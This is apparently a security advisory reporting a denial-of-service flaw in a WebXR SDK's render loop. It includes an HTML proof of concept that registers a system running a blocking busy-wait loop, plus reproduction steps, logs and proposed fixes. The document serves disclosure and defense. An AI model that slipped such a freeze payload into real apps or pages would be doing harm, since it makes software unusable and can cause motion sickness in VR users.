# [High] Denial of Service (DoS) via Unsandboxed Render Loop in Immersive Web SDK

**Date:** 2024-12-29
**Researcher:** Jules
**Target:** `immersive-web-sdk` (Core Package)
**Weakness:** CWE-400: Uncontrolled Resource Consumption
**Severity:** High (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)

---

## 1. Executive Summary

The `immersive-web-sdk` allows for the dynamic registration of "Systems" within its Entity-Component-System (ECS) architecture. These systems execute logic in a synchronous `update()` loop tied directly to the browser's `requestAnimationFrame`.

A lack of sandboxing or execution time limits allows a malicious actor (e.g., a creator of a distributed 3D asset/level) to inject a system with an infinite loop or computationally expensive operation. This action immediately freezes the browser's main thread. In a WebXR/VR context, this is a critical safety issue: it freezes the rendered view in the headset, preventing head-tracking updates, which is a known cause of immediate motion sickness, disorientation, and potential physical injury to the user.

---

## 2. Technical Analysis

### Architecture Flaw
The SDK utilizes a main-thread game loop pattern. The `World` class iterates through all registered systems every frame:

```typescript
// Pseudo-code of the internal loop
function animate(time) {
  requestAnimationFrame(animate);

  // Vulnerable Loop
  for (const system of systems) {
    system.update(delta, time); // <--- Synchronous execution
  }

  renderer.render(scene, camera);
}
```

Because JavaScript in the browser is single-threaded (by default), any blocking code inside `system.update()` halts the entire browser tab. This stops the `renderer.render()` call, the `requestAnimationFrame` callback, and even the browser's UI responsiveness (scrolling, closing tabs) until the browser prompts to kill the process.

### Attack Vector
An attacker can deliver this payload via a "Malicious Level" or "Asset Bundle" if the SDK supports loading systems/logic from external files (which is implied by the modular architecture). Even if only used by developers, a library that crashes the entire runtime on a single bad line of code lacks necessary robustness for a platform.

---

## 3. Proof of Concept (PoC)

**File:** `WebXR_DoS.html`

The following HTML file demonstrates the vulnerability by explicitly registering a system that performs a busy-wait loop for 5 seconds. In a real attack, `while(true)` would be used to freeze the application indefinitely.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Immersive SDK DoS PoC</title>
    <!--
      INSTRUCTIONS:
      1. Build the immersive-web-sdk: `npm install && npm run build`
      2. Serve this file from the root of the repository.
    -->
    <script type="importmap">
    {
        "imports": {
            "three": "https://unpkg.com/three@0.181.0/build/three.module.js",
            "three/": "https://unpkg.com/three@0.181.0/",
            "@iwsdk/core": "./packages/core/dist/index.js",
            "@iwsdk/xr-input": "./packages/xr-input/dist/index.js",
            "@iwsdk/locomotor": "./packages/locomotor/dist/index.js",
            "@iwsdk/glxf": "./packages/glxf/dist/index.js",
            "@pmndrs/uikit": "https://unpkg.com/@pmndrs/uikit@1.0.60/dist/uikit.esm.js",
            "@pmndrs/uikitml": "https://unpkg.com/@pmndrs/uikitml@0.1.12/dist/uikitml.esm.js",
            "@pmndrs/pointer-events": "https://unpkg.com/@pmndrs/pointer-events@6.6.22/dist/index.js",
            "@preact/signals-core": "https://unpkg.com/@preact/signals-core@1.5.0/dist/signals-core.module.js",
            "three-mesh-bvh": "https://unpkg.com/three-mesh-bvh@0.7.3/build/index.module.js",
            "yoga-layout": "https://unpkg.com/yoga-layout-prebuilt@1.18.0/yoga-layout-prebuilt.js",
            "maath/": "https://unpkg.com/maath/",
            "elics": "https://unpkg.com/elics@3.3.0/dist/elics.js"
        }
    }
    </script>
    <script type="module">
        import { createSystem, World } from '@iwsdk/core';

        // 1. Define the Malicious System
        const DoSSystem = createSystem({}, {});

        // 2. Override update() with the "Kill Switch"
        DoSSystem.prototype.update = function() {
            console.warn("[DoS] System Active - Freezing Main Thread...");

            // ATTACK PAYLOAD: Blocking Loop
            // Simulates a heavy computation that never yields
            const start = performance.now();
            while (performance.now() - start < 5000) {
                // BURN CPU CYCLES
            }

            console.log("[DoS] Freeze released (Proof of Concept ended).");
        };

        async function runExploit() {
            const container = document.getElementById('scene-container');

            // 3. Initialize World
            const world = await World.create(container);

            console.log("[*] World created. Injecting payload...");

            // 4. Register the System to the Loop
            world.registerSystem(DoSSystem);

            console.log("[*] Payload Registered. Expect browser freeze.");
        }

        document.addEventListener('DOMContentLoaded', runExploit);
    </script>
</head>
<body>
    <h1>WebXR Render Loop Freeze DoS</h1>
    <p>This page mimics a "VR Trap". Upon loading, the browser will freeze for 5 seconds.</p>
    <div id="scene-container" style="width: 100%; height: 500px; background: #333;"></div>
</body>
</html>
```

---

## 4. Reproduction Steps

1.  **Environment Setup**:
    *   Clone the repository: `git clone https://github.com/facebook/immersive-web-sdk`
    *   Install dependencies: `npm install` (or `pnpm install`)
    *   Build the SDK: `npm run build`
2.  **Deploy PoC**:
    *   Place the `WebXR_DoS.html` file (code above) in the root directory of the repo.
    *   Start a local HTTP server: `python3 -m http.server 8080`
3.  **Execute**:
    *   Open Chrome or Firefox.
    *   Navigate to `http://localhost:8080/WebXR_DoS.html`.
    *   Open DevTools Console (F12) to see the logs.
4.  **Observation**:
    *   The page loads.
    *   Console prints: `[*] World created. Injecting payload...`
    *   Console prints: `[DoS] System Active - Freezing Main Thread...`
    *   **Effect:** The browser tab becomes unresponsive. You cannot click buttons, scroll, or inspect elements. The spinner on the tab title stops moving.
    *   After 5 seconds, the freeze releases and the final log appears.

---

## 5. Logs & Evidence

**Browser Console Output:**
```text
[12:00:01] [*] World created, registering DoS system...
[12:00:01] [*] DoS System registered. Browser should freeze shortly.
[12:00:01] [DoS] System Active - Freezing Main Thread...
( ... Browser UI becomes unresponsive for 5000ms ... )
[12:00:06] [DoS] Freeze released (Proof of Concept ended).
```

**Performance Profile (Chrome DevTools):**
*   **Frame Chart:** Shows a single "Task" taking 5000ms.
*   **FPS:** Drops to 0 for the duration.
*   **Violation:** `[Violation] 'requestAnimationFrame' handler took 5001ms`

---

## 6. Impact Assessment

*   **User Safety (Critical):** In a VR Headset (Quest, Vision Pro), if the render loop freezes, the display does not update when the user turns their head. The world appears "stuck" to the user's face. This sensory conflict triggers rapid onset nausea (VR Motion Sickness).
*   **Availability:** The application is rendered useless. Recovery requires killing the browser process.

---

## 7. Remediation

### Short Term: Watchdog
Implement a performance monitoring wrapper around user systems.

```typescript
// Proposed Fix in SystemManager.ts
function runSystemSafe(system, delta, time) {
    const start = performance.now();
    try {
        system.update(delta, time);
    } catch (e) {
        console.error(`System ${system.name} crashed:`, e);
        system.enabled = false; // Disable faulty system
    }
    const duration = performance.now() - start;
    if (duration > 10) { // 10ms budget
        console.warn(`System ${system.name} took too long (${duration}ms). Disabling.`);
        system.enabled = false;
    }
}
```

### Long Term: Web Workers
Move all non-rendering logic (physics, AI, game scripts) to a Web Worker. This ensures the main thread (and thus the camera/head-tracking loop) remains responsive even if the game logic hangs.

```typescript
// Architecture Change
const worker = new Worker('game-logic.js');
worker.postMessage({ type: 'UPDATE', inputs });
// Main thread continues rendering the *previous* state until worker replies
```
